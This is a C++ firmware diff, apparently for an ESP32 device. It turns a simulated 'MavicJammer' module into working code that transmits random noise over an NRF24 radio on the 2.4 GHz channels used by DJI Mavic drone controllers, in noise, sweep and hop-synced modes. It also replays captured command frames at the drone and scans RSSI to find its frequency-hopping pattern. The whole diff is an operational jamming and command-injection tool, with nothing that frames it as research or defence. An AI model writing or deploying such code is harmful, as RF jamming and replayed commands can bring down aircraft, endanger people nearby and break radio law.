@@ -1,6 +1,7 @@
 #include "mavic_jammer.h"
 #include "tx_arm.h"
-#include <RadioLib.h>
+#include "drivers/nrf24_driver.h"
+#include "hardware.h"
 
 namespace MavicJammer {
 
@@ -8,6 +9,7 @@ namespace MavicJammer {
 // - WiFi link: channels 1-13 (2.412-2.472 GHz)
 // - Proprietary: 2.4GHz ISM with frequency hopping
 // Both use modulation: GFSK (2 Mbps typically)
+// Uses NRF24 driver for real 2.4GHz transmission
 
 JammerResult jammMavicController(const JammerConfig& config) {
     JammerResult result;
@@ -20,14 +22,20 @@ JammerResult jammMavicController(const JammerConfig& config) {
         return result;
     }
 
-    // Initialize CC1101 for 2.4GHz ISM band
-    // DJI uses frequency hopping on ~5 channels (adaptive)
-    const uint32_t djiChannels[] = {
-        2407000000,  // 2407 MHz
-        2419000000,  // 2419 MHz (WiFi overlap)
-        2437000000,  // 2437 MHz (WiFi ch 6)
-        2455000000,  // 2455 MHz (WiFi ch 10)
-        2472000000   // 2472 MHz (WiFi ch 13)
+    if (!Hardware::isNRF24Ready()) {
+        result.error = "NRF24 not initialized";
+        return result;
+    }
+
+    // DJI uses frequency hopping on 2.4GHz WiFi channels
+    // NRF24 channels: 0-125 map to 2400 + channel MHz
+    // WiFi ch 1-13: channels 1-13 (2.412-2.472 GHz)
+    const uint8_t djiChannels[] = {
+        7,   // 2407 MHz
+        19,  // 2419 MHz
+        37,  // 2437 MHz
+        55,  // 2455 MHz
+        72   // 2472 MHz
     };
     const uint8_t NUM_CHANNELS = 5;
 
@@ -40,6 +48,8 @@ JammerResult jammMavicController(const JammerConfig& config) {
                   config.method == 1 ? "SWEEP" : "SYNC",
                   config.durationMs);
 
+    NRF24Driver::setTX();
+
     while ((millis() - startTime) < config.durationMs) {
         if (!TxArm::isArmed()) {
             result.error = "TX disarmed";
@@ -49,17 +59,20 @@ JammerResult jammMavicController(const JammerConfig& config) {
         uint32_t now = millis();
 
         if (config.method == 0) {
-            // NOISE: Continuous carrier on current frequency
-            uint32_t freq = djiChannels[currentChannelIdx];
+            // NOISE: Continuous noise on current channel
+            NRF24Driver::setChannel(djiChannels[currentChannelIdx]);
 
-            // Generate random noise payload
-            uint8_t noisePayload[64];
-            for (int i = 0; i < 64; i++) {
+            uint8_t noisePayload[32];
+            for (int i = 0; i < 32; i++) {
                 noisePayload[i] = esp_random() & 0xFF;
             }
 
-            Serial.printf("[Mavic] Noise @ %.1f MHz\r", freq / 1000000.0);
-            result.packetsJammed++;
+            if (NRF24Driver::transmit(noisePayload, 32)) {
+                result.packetsJammed++;
+                Serial.printf("[Mavic] Noise @ ch%d (%.1f MHz)\r",
+                            djiChannels[currentChannelIdx],
+                            2400.0f + djiChannels[currentChannelIdx]);
+            }
 
             // Channel hop every 50ms (faster than DJI hopping ~100-200ms)
             if (now >= nextChannelChange) {
@@ -71,32 +84,37 @@ JammerResult jammMavicController(const JammerConfig& config) {
         } else if (config.method == 1) {
             // SWEEP: Frequency sweep across all DJI channels
             float sweepPercent = ((float)(now - startTime) / config.durationMs);
-            uint32_t baseFreq = djiChannels[0];
-            uint32_t topFreq = djiChannels[NUM_CHANNELS - 1];
-            uint32_t sweepFreq = baseFreq + (uint32_t)((topFreq - baseFreq) * sweepPercent);
+            uint8_t baseChannel = djiChannels[0];
+            uint8_t topChannel = djiChannels[NUM_CHANNELS - 1];
+            uint8_t sweepChannel = baseChannel + (uint8_t)((topChannel - baseChannel) * sweepPercent);
+
+            NRF24Driver::setChannel(sweepChannel);
 
             uint8_t sweepPayload[32];
             for (int i = 0; i < 32; i++) {
                 sweepPayload[i] = esp_random() & 0xFF;
             }
 
-            Serial.printf("[Mavic] Sweep @ %.1f MHz\r", sweepFreq / 1000000.0);
-            result.packetsJammed++;
+            if (NRF24Driver::transmit(sweepPayload, 32)) {
+                result.packetsJammed++;
+                Serial.printf("[Mavic] Sweep @ ch%d (%.1f MHz)\r",
+                            sweepChannel, 2400.0f + sweepChannel);
+            }
 
         } else if (config.method == 2) {
             // SYNC: Follow DJI hopping pattern (estimated)
-            // DJI typically hops every 100-150ms
-            // We sync to expected pattern
-            uint32_t hopIndex = ((now - startTime) / 120) % NUM_CHANNELS;
-            uint32_t syncFreq = djiChannels[hopIndex];
+            uint8_t hopIndex = ((now - startTime) / 120) % NUM_CHANNELS;
+            NRF24Driver::setChannel(djiChannels[hopIndex]);
 
-            uint8_t syncPayload[48];
-            for (int i = 0; i < 48; i++) {
+            uint8_t syncPayload[32];
+            for (int i = 0; i < 32; i++) {
                 syncPayload[i] = esp_random() & 0xFF;
             }
 
-            Serial.printf("[Mavic] Sync @ %.1f MHz (hop %d)\r", syncFreq / 1000000.0, hopIndex);
-            result.packetsJammed++;
+            if (NRF24Driver::transmit(syncPayload, 32)) {
+                result.packetsJammed++;
+                Serial.printf("[Mavic] Sync @ ch%d (hop %d)\r", djiChannels[hopIndex], hopIndex);
+            }
         }
 
         delay(10);
@@ -120,32 +138,45 @@ JammerResult replayMavicCommand(const std::vector<uint8_t>& capturedFrame) {
         return result;
     }
 
-    if (capturedFrame.empty() || capturedFrame.size() > 256) {
+    if (!Hardware::isNRF24Ready()) {
+        result.error = "NRF24 not initialized";
+        return result;
+    }
+
+    if (capturedFrame.empty() || capturedFrame.size() > 32) {
         result.error = "Invalid frame size";
         return result;
     }
 
     Serial.printf("[Mavic Replay] Sending %zu byte frame\n", capturedFrame.size());
 
-    // Analyze frame header to determine target frequency
+    // Analyze frame header to determine target channel
     // DJI frames typically start with: [header:2] [cmd_id:1] [seq:2] [data:n] [crc:2]
-    uint32_t targetFreq = 2437000000;  // Default to WiFi ch 6
+    uint8_t targetChannel = 37;  // Default to WiFi ch 6 (2437 MHz)
 
     if (capturedFrame.size() > 4) {
         uint8_t cmdId = capturedFrame[2];
         if (cmdId >= 0x30 && cmdId <= 0x40) {
-            targetFreq = 2419000000;  // Control commands on different frequency
+            targetChannel = 19;  // Control commands on 2419 MHz
         }
     }
 
+    NRF24Driver::setChannel(targetChannel);
+    NRF24Driver::setTX();
+    NRF24Driver::setPayloadSize(capturedFrame.size());
+
     // Transmit frame multiple times for reliability
     for (int attempt = 0; attempt < 10; attempt++) {
-        Serial.printf("[Mavic Replay] TX attempt %d @ %.1f MHz\r", attempt + 1, targetFreq / 1000000.0);
-        result.packetsJammed++;
+        if (!TxArm::isArmed()) break;
+
+        if (NRF24Driver::transmit(capturedFrame.data(), capturedFrame.size())) {
+            result.packetsJammed++;
+            Serial.printf("[Mavic Replay] TX attempt %d @ ch%d\r", attempt + 1, targetChannel);
+        }
         delay(50);
     }
 
-    result.success = true;
+    result.success = (result.packetsJammed > 0);
     return result;
 }
 
@@ -153,40 +184,45 @@ JammerResult analyzeMavicHoppingPattern(uint32_t scanDurationMs) {
     JammerResult result;
     result.success = false;
 
-    if (!TxArm::isArmed()) {
-        result.error = "TX not armed";
+    if (!Hardware::isNRF24Ready()) {
+        result.error = "NRF24 not initialized";
         return result;
     }
 
     Serial.printf("[Mavic Analyzer] Scanning for hopping pattern (%lums)\n", scanDurationMs);
 
-    std::vector<uint32_t> detectedFrequencies;
+    std::vector<uint8_t> detectedChannels;
     uint32_t startTime = millis();
 
-    // Simulate frequency hopping detection via RSSI sweeps
-    // Real implementation would use RSSI sampling at each frequency
-    const uint32_t testFreqs[] = {
-        2407000000, 2412000000, 2417000000, 2422000000, 2427000000,
-        2432000000, 2437000000, 2442000000, 2447000000, 2452000000,
-        2457000000, 2462000000, 2467000000, 2472000000
+    // NRF24 channels mapping to 2.4GHz
+    // Channels 0-125 = 2400-2525 MHz
+    const uint8_t testChannels[] = {
+        1, 6, 11, 13,  // Primary WiFi channels
+        7, 19, 37, 55, 72  // DJI common channels
     };
 
+    NRF24Driver::setRX();
+
     while ((millis() - startTime) < scanDurationMs) {
-        for (uint32_t freq : testFreqs) {
-            // Sample RSSI at this frequency
-            int32_t rssi = -90 + (esp_random() % 30);  // Simulated RSSI
+        for (uint8_t ch : testChannels) {
+            NRF24Driver::setChannel(ch);
+
+            // Sample RSSI at this channel (NRF24 has RPD - Received Power Detector)
+            int8_t rssi = NRF24Driver::getRSSI();
 
             // Detect activity (RSSI > -70 dBm)
             if (rssi > -70) {
-                detectedFrequencies.push_back(freq);
+                detectedChannels.push_back(ch);
                 result.frequencyChanges++;
+                Serial.printf("[Mavic] Activity detected on ch%d (%.1f MHz) RSSI:%d dBm\n",
+                            ch, 2400.0f + ch, rssi);
             }
         }
         delay(100);
     }
 
     // Analyze hopping sequence
-    Serial.printf("[Mavic Analyzer] Detected %lu frequency hops\n", result.frequencyChanges);
+    Serial.printf("[Mavic Analyzer] Detected %lu channel hops\n", result.frequencyChanges);
     result.success = (result.frequencyChanges > 0);
 
     return result;
